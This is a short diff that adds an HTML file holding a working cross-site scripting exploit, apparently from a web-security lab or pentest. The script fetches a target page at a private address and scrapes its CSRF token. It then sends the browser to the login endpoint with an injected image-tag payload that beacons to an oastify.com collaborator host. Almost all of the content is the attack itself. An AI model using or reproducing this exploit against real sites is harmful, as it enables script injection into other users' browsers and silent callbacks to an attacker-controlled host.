@@ -1,0 +1,16 @@
+<script>
+    function xss(url, text, vector) {
+        location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+    }
+    
+    function fetchUrl(url, collaboratorURL){
+        fetch(url).then(r => r.text().then(text => {
+            xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
+        }))
+    }
+    
+    fetchUrl("http://192.168.0.5:8080", "http://thebqwu1v54j9zqnf9zit3tr0i69ubi0.oastify.com");
+</script>
+
+
+<!-- Success -->
